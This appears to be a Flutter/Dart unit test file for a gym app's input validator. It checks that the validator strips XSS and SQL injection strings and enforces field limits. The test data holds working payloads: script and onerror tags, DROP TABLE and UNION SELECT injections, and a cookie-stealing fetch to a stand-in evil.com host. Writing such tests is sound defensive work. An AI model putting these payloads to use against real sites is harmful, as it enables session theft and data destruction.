import 'package:flutter_test/flutter_test.dart';
import 'package:gymbro_flutter_new/shared/domain/services/input_validator.dart';

void main() {
  late InputValidator validator;

  setUp(() {
    validator = InputValidator();
  });

  group('InputValidator - XSS Attack Prevention', () {
    test('should remove <script> tags', () {
      const input = '<script>alert("xss")</script>My Workout';
      final sanitized = validator.sanitize(input);

      expect(sanitized, 'My Workout');
      expect(sanitized.contains('<script>'), false);
      expect(sanitized.contains('alert'), false);
    });

    test('should remove <img> tags with onerror', () {
      const input = '<img src=x onerror=alert(1)>Workout';
      final sanitized = validator.sanitize(input);

      expect(sanitized, 'Workout');
      expect(sanitized.contains('<img'), false);
      expect(sanitized.contains('onerror'), false);
    });

    test('should remove onclick event handlers', () {
      const input = '<div onclick="malicious()">Text</div>';
      final sanitized = validator.sanitize(input);

      expect(sanitized, 'Text');
      expect(sanitized.contains('onclick'), false);
      expect(sanitized.contains('malicious'), false);
    });

    test('should remove nested HTML tags', () {
      const input = '<div><span><b>Nested</b> Tags</span></div>';
      final sanitized = validator.sanitize(input);

      expect(sanitized, 'Nested Tags');
      expect(sanitized.contains('<'), false);
      expect(sanitized.contains('>'), false);
    });

    test('should remove iframe tags', () {
      const input = '<iframe src="evil.com"></iframe>Content';
      final sanitized = validator.sanitize(input);

      expect(sanitized, 'Content');
      expect(sanitized.contains('<iframe'), false);
    });

    test('should remove multiple XSS attempts', () {
      const input =
          '<script>alert("xss")</script><img src=x onerror=alert(1)>Safe Text';
      final sanitized = validator.sanitize(input);

      expect(sanitized, 'Safe Text');
      expect(sanitized.contains('<script>'), false);
      expect(sanitized.contains('<img'), false);
      expect(sanitized.contains('alert'), false);
    });

    test('should remove onload event handler', () {
      const input = '<body onload=alert("xss")>Text</body>';
      final sanitized = validator.sanitize(input);

      expect(sanitized, 'Text');
      expect(sanitized.contains('onload'), false);
    });

    test('should detect dangerous patterns', () {
      const dangerousInputs = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        "'; DROP TABLE users; --",
      ];

      for (final input in dangerousInputs) {
        expect(
          validator.containsDangerousPatterns(input),
          true,
          reason: 'Failed to detect: $input',
        );
      }
    });
  });

  group('InputValidator - SQL Injection Prevention', () {
    test('should remove single quotes', () {
      const input = "'; DROP TABLE users; --";
      final sanitized = validator.sanitize(input);

      expect(sanitized.contains("'"), false);
      expect(sanitized.contains(';'), false);
      expect(sanitized, 'DROP TABLE users --'); // Trimmed
    });

    test('should remove double quotes', () {
      const input = '"; DELETE FROM workouts WHERE "1"="1';
      final sanitized = validator.sanitize(input);

      expect(sanitized.contains('"'), false);
      expect(sanitized.contains(';'), false);
    });

    test('should remove backslashes', () {
      const input = r"Test\' OR \'1\'=\'1";
      final sanitized = validator.sanitize(input);

      expect(sanitized.contains(r'\'), false);
      expect(sanitized.contains("'"), false);
    });

    test('should remove semicolons', () {
      const input = 'Test; DROP TABLE exercises;';
      final sanitized = validator.sanitize(input);

      expect(sanitized.contains(';'), false);
      expect(sanitized, 'Test DROP TABLE exercises');
    });

    test('should remove multiple SQL injection chars', () {
      const input = r"'; DROP TABLE users; --\";
      final sanitized = validator.sanitize(input);

      expect(sanitized.contains("'"), false);
      expect(sanitized.contains(';'), false);
      expect(sanitized.contains(r'\'), false);
      expect(sanitized.contains('"'), false);
    });

    test('should prevent SQL comment injection', () {
      const input = "Test' OR '1'='1' --";
      final sanitized = validator.sanitize(input);

      expect(sanitized.contains("'"), false);
      expect(sanitized, 'Test OR 1=1 --');
    });

    test('should prevent UNION SELECT injection', () {
      const input = "'; UNION SELECT * FROM users; --";
      final sanitized = validator.sanitize(input);

      expect(sanitized.contains("'"), false);
      expect(sanitized.contains(';'), false);
    });
  });

  group('InputValidator - Workout Name Validation', () {
    test('should accept valid workout name', () {
      const validNames = [
        'Push Day',
        'Pull Workout A',
        'Leg Day - Heavy',
        'Upper Body Strength',
      ];

      for (final name in validNames) {
        expect(
          validator.isValidWorkoutName(name),
          true,
          reason: 'Should accept: $name',
        );
      }
    });

    test('should reject too short workout name', () {
      expect(validator.isValidWorkoutName('AB'), false);
      expect(validator.isValidWorkoutName('X'), false);
    });

    test('should reject too long workout name', () {
      final longName = 'A' * 51; // 51 characters
      expect(validator.isValidWorkoutName(longName), false);
    });

    test('should reject empty workout name', () {
      expect(validator.isValidWorkoutName(''), false);
    });

    test('should reject workout name that becomes empty after sanitization', () {
      expect(validator.isValidWorkoutName('<script></script>'), false);
      expect(validator.isValidWorkoutName("'';--"), false);
    });

    test('should sanitize and validate workout name', () {
      const input = 'Push Day <script>alert(1)</script>';
      final result = validator.sanitizeAndValidateWorkoutName(input);

      expect(result, 'Push Day');
      expect(result.contains('<script>'), false);
    });

    test('should throw ValidationException for invalid workout name', () {
      expect(
        () => validator.sanitizeAndValidateWorkoutName('AB'),
        throwsA(isA<ValidationException>()),
      );
    });
  });

  group('InputValidator - Exercise Name Validation', () {
    test('should accept valid exercise names', () {
      const validNames = [
        'Squat',
        'Bench Press',
        'Deadlift',
        'Overhead Press',
      ];

      for (final name in validNames) {
        expect(
          validator.isValidExerciseName(name),
          true,
          reason: 'Should accept: $name',
        );
      }
    });

    test('should reject too short exercise name', () {
      expect(validator.isValidExerciseName('A'), false);
    });

    test('should reject too long exercise name', () {
      final longName = 'A' * 101; // 101 characters
      expect(validator.isValidExerciseName(longName), false);
    });

    test('should sanitize and validate exercise name', () {
      const input = 'Bench Press <img src=x onerror=alert(1)>';
      final result = validator.sanitizeAndValidateExerciseName(input);

      expect(result, 'Bench Press');
      expect(result.contains('<img'), false);
    });
  });

  group('InputValidator - Notes Validation', () {
    test('should accept valid notes', () {
      const validNotes = [
        'Felt strong today',
        'Need to work on form',
        'PR attempt next session',
      ];

      for (final note in validNotes) {
        expect(
          validator.isValidNotes(note),
          true,
          reason: 'Should accept: $note',
        );
      }
    });

    test('should accept empty/null notes (optional field)', () {
      expect(validator.isValidNotes(null), true);
      expect(validator.isValidNotes(''), true);
    });

    test('should reject notes longer than 500 chars', () {
      final longNotes = 'A' * 501;
      expect(validator.isValidNotes(longNotes), false);
    });

    test('should sanitize notes and remove XSS', () {
      const input = 'Good workout <script>alert("xss")</script> today';
      final result = validator.sanitizeAndValidateNotes(input);

      expect(result, 'Good workout today');
      expect(result!.contains('<script>'), false);
    });

    test('should return null for empty notes', () {
      expect(validator.sanitizeAndValidateNotes(null), null);
      expect(validator.sanitizeAndValidateNotes(''), null);
    });
  });

  group('InputValidator - Numeric Validation', () {
    test('should accept valid weight values', () {
      const validWeights = [0.0, 20.5, 80.0, 150.5, 500.0, 1000.0];

      for (final weight in validWeights) {
        expect(
          validator.isValidWeight(weight),
          true,
          reason: 'Should accept weight: $weight',
        );
      }
    });

    test('should reject invalid weight values', () {
      const invalidWeights = [-1.0, -10.5, 1001.0, 5000.0];

      for (final weight in invalidWeights) {
        expect(
          validator.isValidWeight(weight),
          false,
          reason: 'Should reject weight: $weight',
        );
      }
    });

    test('should reject null weight', () {
      expect(validator.isValidWeight(null), false);
    });

    test('should accept valid reps values', () {
      const validReps = [1, 5, 10, 15, 20, 50, 100];

      for (final reps in validReps) {
        expect(
          validator.isValidReps(reps),
          true,
          reason: 'Should accept reps: $reps',
        );
      }
    });

    test('should reject invalid reps values', () {
      const invalidReps = [0, -1, -10, 101, 500];

      for (final reps in invalidReps) {
        expect(
          validator.isValidReps(reps),
          false,
          reason: 'Should reject reps: $reps',
        );
      }
    });

    test('should reject null reps', () {
      expect(validator.isValidReps(null), false);
    });

    test('should accept valid sets values', () {
      const validSets = [1, 3, 5, 10, 15, 20];

      for (final sets in validSets) {
        expect(
          validator.isValidSets(sets),
          true,
          reason: 'Should accept sets: $sets',
        );
      }
    });

    test('should reject invalid sets values', () {
      const invalidSets = [0, -1, 21, 50];

      for (final sets in invalidSets) {
        expect(
          validator.isValidSets(sets),
          false,
          reason: 'Should reject sets: $sets',
        );
      }
    });
  });

  group('InputValidator - Profile Validation', () {
    test('should accept valid display names', () {
      const validNames = [
        'JohnDoe',
        'FitnessGuru123',
        'Mike Smith',
        'athlete_2024',
      ];

      for (final name in validNames) {
        expect(
          validator.isValidProfileDisplayName(name),
          true,
          reason: 'Should accept: $name',
        );
      }
    });

    test('should reject too short display name', () {
      expect(validator.isValidProfileDisplayName('AB'), false);
    });

    test('should reject too long display name', () {
      final longName = 'A' * 31; // 31 characters
      expect(validator.isValidProfileDisplayName(longName), false);
    });

    test('should sanitize display name', () {
      const input = 'JohnDoe<script>alert(1)</script>';
      final result = validator.sanitizeAndValidateProfileDisplayName(input);

      expect(result, 'JohnDoe'); // Script content fully removed (secure)
      expect(result.contains('<script>'), false);
      expect(result.contains('alert'), false);
    });

    test('should accept valid bio', () {
      const validBios = [
        'Fitness enthusiast from Italy',
        'Powerlifting coach with 10+ years experience',
        'Just trying to stay healthy',
      ];

      for (final bio in validBios) {
        expect(
          validator.isValidProfileBio(bio),
          true,
          reason: 'Should accept: $bio',
        );
      }
    });

    test('should accept empty/null bio (optional)', () {
      expect(validator.isValidProfileBio(null), true);
      expect(validator.isValidProfileBio(''), true);
    });

    test('should reject bio longer than 200 chars', () {
      final longBio = 'A' * 201;
      expect(validator.isValidProfileBio(longBio), false);
    });

    test('should sanitize bio and remove XSS', () {
      const input = 'Coach from Italy <img src=x onerror=alert(1)>';
      final result = validator.sanitizeAndValidateProfileBio(input);

      expect(result, 'Coach from Italy');
      expect(result!.contains('<img'), false);
    });
  });

  group('InputValidator - Edge Cases', () {
    test('should handle whitespace-only input', () {
      const input = '   ';
      final sanitized = validator.sanitize(input);

      expect(sanitized, '');
    });

    test('should normalize excessive whitespace', () {
      const input = 'Push    Day     Workout';
      final sanitized = validator.sanitize(input);

      expect(sanitized, 'Push Day Workout');
    });

    test('should handle mixed attack vectors', () {
      const input =
          '<script>alert("xss")</script>\'; DROP TABLE users; --<img src=x onerror=alert(1)>';
      final sanitized = validator.sanitize(input);

      expect(sanitized.contains('<script>'), false);
      expect(sanitized.contains("'"), false);
      expect(sanitized.contains(';'), false);
      expect(sanitized.contains('<img'), false);
      expect(sanitized.contains('DROP TABLE'), true); // Text remains
    });

    test('should handle unicode and special chars (non-malicious)', () {
      const input = 'Café Workout 🏋️‍♂️';
      final sanitized = validator.sanitize(input);

      expect(sanitized, input); // Should not modify
    });

    test('should handle empty string', () {
      final sanitized = validator.sanitize('');
      expect(sanitized, '');
    });

    test('should preserve safe content after sanitization', () {
      const input = 'Bench Press - 3x10 @ 80kg';
      final sanitized = validator.sanitize(input);

      expect(sanitized, input); // Should not modify safe content
    });
  });

  group('InputValidator - Real-World Attack Scenarios', () {
    test('should prevent stored XSS attack', () {
      // Attacker tries to inject malicious script that executes when displayed
      const attackInput =
          'My Workout<script>fetch("evil.com?cookie="+document.cookie)</script>';
      final sanitized = validator.sanitize(attackInput);

      expect(sanitized, 'My Workout');
      expect(sanitized.contains('script'), false);
      expect(sanitized.contains('fetch'), false);
    });

    test('should prevent SQL injection in workout name', () {
      // Attacker tries to inject SQL that could be executed if not using parameterized queries
      const attackInput = "Leg Day'; DELETE FROM workouts WHERE '1'='1";
      final sanitized = validator.sanitize(attackInput);

      expect(sanitized.contains("'"), false);
      expect(sanitized.contains(';'), false);
    });

    test('should prevent DOM-based XSS', () {
      // Attacker tries to inject onclick handler
      const attackInput =
          '<img src=valid.jpg onclick="alert(document.cookie)">';
      final sanitized = validator.sanitize(attackInput);

      expect(sanitized, '');
      expect(sanitized.contains('onclick'), false);
    });

    test('should prevent blind SQL injection', () {
      // Attacker tries boolean-based blind SQL injection
      const attackInput = "Workout' AND 1=1 --";
      final sanitized = validator.sanitize(attackInput);

      expect(sanitized.contains("'"), false);
      expect(sanitized, 'Workout AND 1=1 --');
    });

    test('should prevent polyglot attack (XSS + SQL injection)', () {
      // Attacker tries combined attack vector
      const attackInput =
          r'''<script>alert('xss')</script>'; DROP TABLE users; --''';
      final sanitized = validator.sanitize(attackInput);

      expect(sanitized.contains('<script>'), false);
      expect(sanitized.contains("'"), false);
      expect(sanitized.contains(';'), false);
    });
  });
}
